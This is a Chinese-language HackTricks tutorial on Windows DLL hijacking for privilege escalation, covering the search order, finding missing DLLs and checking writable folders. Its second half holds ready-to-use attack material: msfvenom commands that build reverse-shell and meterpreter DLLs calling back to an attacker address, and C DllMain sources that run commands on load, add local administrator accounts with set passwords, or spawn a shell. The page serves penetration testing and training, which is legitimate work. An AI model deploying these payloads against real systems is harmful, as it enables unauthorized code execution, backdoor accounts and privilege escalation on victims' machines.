# DLL劫持

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[NFT](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

<figure><img src="../../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**漏洞赏金提示**：**注册**Intigriti，这是一家由黑客创建的高级**漏洞赏金平台**！立即加入我们，开始赚取高达**$100,000**的赏金：[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)。

{% embed url="https://go.intigriti.com/hacktricks" %}

## 基本信息

DLL劫持涉及操纵受信任的应用程序以加载恶意DLL。此术语涵盖了几种策略，如**DLL欺骗、注入和侧向加载**。主要用于代码执行、实现持久性，较少用于权限提升。尽管这里关注的是提升权限，但劫持方法在不同目标中保持一致。

### 常见技术

DLL劫持采用多种方法，每种方法的有效性取决于应用程序的DLL加载策略：

1. **DLL替换**：用恶意DLL替换真实DLL，可选择使用DLL代理以保留原始DLL的功能。
2. **DLL搜索顺序劫持**：将恶意DLL放置在合法DLL之前的搜索路径中，利用应用程序的搜索模式。
3. **虚拟DLL劫持**：为应用程序创建一个恶意DLL以加载，认为它是一个不存在的必需DLL。
4. **DLL重定向**：修改搜索参数如`%PATH%`或`.exe.manifest` / `.exe.local`文件，将应用程序定向到恶意DLL。
5. **WinSxS DLL替换**：在WinSxS目录中用恶意对应物替换合法DLL，这种方法通常与DLL侧向加载相关联。
6. **相对路径DLL劫持**：将恶意DLL放置在用户可控目录中与复制的应用程序一起，类似于二进制代理执行技术。

## 查找缺失的DLL

查找系统中缺失的DLL最常见的方法是从sysinternals运行[procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)，**设置以下2个过滤器**：

![](<../../../.gitbook/assets/image (961).png>)

![](<../../../.gitbook/assets/image (230).png>)

然后只显示**文件系统活动**：

![](<../../../.gitbook/assets/image (153).png>)

如果您正在**一般查找缺失的DLL**，可以让其运行一段时间。\
如果您正在查找**特定可执行文件中的缺失DLL**，应设置**另一个过滤器，如“进程名称”“包含”“<exec名称>”，执行它，然后停止捕获事件**。

## 利用缺失的DLL

为了提升权限，我们最好的机会是能够**编写一个特权进程将尝试加载的DLL**，在某个**将被搜索的地方**。因此，我们将能够**在一个**比**原始DLL的文件夹**更早被搜索的文件夹**中编写**一个DLL（奇怪的情况），或者我们将能够**在某个将被搜索的文件夹中编写**一个DLL，而原始**DLL在任何文件夹中都不存在**。

### DLL搜索顺序

**在**[**Microsoft文档**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **中，您可以找到DLL的加载方式。**

**Windows应用程序**通过遵循一组**预定义的搜索路径**来查找DLL，遵循特定的顺序。当有害DLL被策略性地放置在这些目录之一中，确保它在真实DLL之前加载时，DLL劫持问题就会出现。防止这种情况的解决方案是确保应用程序在引用所需DLL时使用绝对路径。

您可以在下面看到**32位系统上的DLL搜索顺序**：

1. 应用程序加载的目录。
2. 系统目录。使用[**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya)函数获取此目录的路径。(_C:\Windows\System32_)
3. 16位系统目录。没有函数可以获取此目录的路径，但会被搜索。(_C:\Windows\System_)
4. Windows目录。使用[**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya)函数获取此目录的路径。(_C:\Windows_)
5. 当前目录。
6. 列在PATH环境变量中的目录。请注意，这不包括由**App Paths**注册表键指定的每个应用程序路径。**App Paths**键在计算DLL搜索路径时不使用。

这是启用**SafeDllSearchMode**的**默认**搜索顺序。当禁用此功能时，当前目录会升至第二位。要禁用此功能，请创建**HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode**注册表值，并将其设置为0（默认为启用）。

如果使用[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa)函数调用**LOAD\_WITH\_ALTERED\_SEARCH\_PATH**，搜索将从**LoadLibraryEx**正在加载的可执行模块的目录开始。

最后，请注意**DLL可以加载指示绝对路径而不仅仅是名称**。在这种情况下，该DLL**只会在该路径中搜索**（如果DLL有任何依赖项，它们将按名称搜索）。

还有其他改变搜索顺序的方法，但我不会在这里解释。
#### Windows文档中关于DLL搜索顺序的异常情况

Windows文档中指出了标准DLL搜索顺序的某些异常情况：

- 当遇到一个与内存中已加载的DLL同名的DLL时，系统会绕过通常的搜索顺序。相反，它会在默认使用内存中已加载的DLL之前，执行重定向和清单检查。在这种情况下，系统不会搜索该DLL。
- 如果DLL被识别为当前Windows版本的已知DLL，系统将使用其版本的已知DLL以及任何依赖的DLL，跳过搜索过程。注册表键HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs保存了这些已知DLL的列表。
- 如果DLL有依赖项，系统会按照它们仅通过模块名称指示的方式进行搜索这些依赖的DLL，而不管最初的DLL是否是通过完整路径标识的。

### 提升权限

**要求**：

- 确定一个将在**不同权限**下运行或将要运行的进程（水平或侧向移动），该进程**缺少一个DLL**。
- 确保**具有写入访问权限**的**目录**中将**搜索**该**DLL**。这个位置可能是可执行文件的目录或系统路径中的一个目录。

是的，这些要求很难找到，因为**默认情况下很难找到一个缺少DLL的特权可执行文件**，而且**更难以在系统路径文件夹上拥有写权限**（默认情况下是不允许的）。但是，在配置错误的环境中，这是可能的。\
如果你很幸运地发现自己符合要求，你可以查看[UACME](https://github.com/hfiref0x/UACME)项目。即使该项目的**主要目标是绕过UAC**，你可能会在那里找到一个用于你所使用的Windows版本的DLL劫持的**PoC**（可能只需更改具有写权限的文件夹的路径）。

请注意，你可以通过以下方式**检查文件夹中的权限**：
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
并**检查路径内所有文件夹的权限**：
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
您还可以使用以下命令检查可执行文件的导入项和 DLL 的导出项：
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
要了解如何**滥用Dll劫持来提升权限**，并具有在**系统路径文件夹**中写入权限，请查看：

{% content-ref url="writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### 自动化工具

[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)将检查您是否具有在系统路径内任何文件夹上的写入权限。\
其他有趣的自动化工具来发现此漏洞是**PowerSploit功能**：_Find-ProcessDLLHijack_、_Find-PathDLLHijack_和_Write-HijackDll_。

### 示例

如果您发现了一个可利用的场景，成功利用它的一个最重要的事情将是**创建一个至少导出可执行文件将从中导入的所有函数的dll**。无论如何，请注意，Dll劫持很方便，可以从中间完整性级别升级到高级别**(绕过UAC)**或从**高完整性升级到SYSTEM**。您可以在此dll劫持研究中找到一个创建有效dll的示例，该研究专注于用于执行的dll劫持：[**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**。**\
此外，在**下一部分**中，您可以找到一些**基本dll代码**，这些代码可能对**模板**或创建具有**不需要导出的函数的dll**有用。

## **创建和编译Dlls**

### **Dll代理**

基本上，**Dll代理**是一个能够**在加载时执行您的恶意代码**，但也能够**公开**并**按照**实际库**的要求**工作的**Dll**。

使用工具[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant)或[**Spartacus**](https://github.com/Accenture/Spartacus)，您实际上可以**指定一个可执行文件并选择要代理的库**，然后**生成一个代理dll**，或者**指定Dll**并**生成一个代理dll**。

### **Meterpreter**

**获取反向shell（x64）：**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**获取一个 meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**创建一个用户（x86 我没有看到 x64 版本）：**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### 你自己

请注意，在几种情况下，您编译的 DLL 必须**导出多个函数**，这些函数将由受害进程加载，如果这些函数不存在，**二进制文件将无法加载**它们，**利用将失败**。
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## 参考资料

* [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
* [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)

<figure><img src="../../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**漏洞悬赏提示**: **注册** Intigriti，一个由黑客创建的高级**漏洞悬赏平台**！立即加入我们，访问 [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)，开始赚取高达**$100,000**的悬赏金！

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

支持 HackTricks 的其他方式:

* 如果您想在 HackTricks 中看到您的**公司广告**或**下载 PDF 版本的 HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 探索[**PEASS Family**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)系列
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或在 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** 上关注我们。**
* 通过向 [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。

</details>
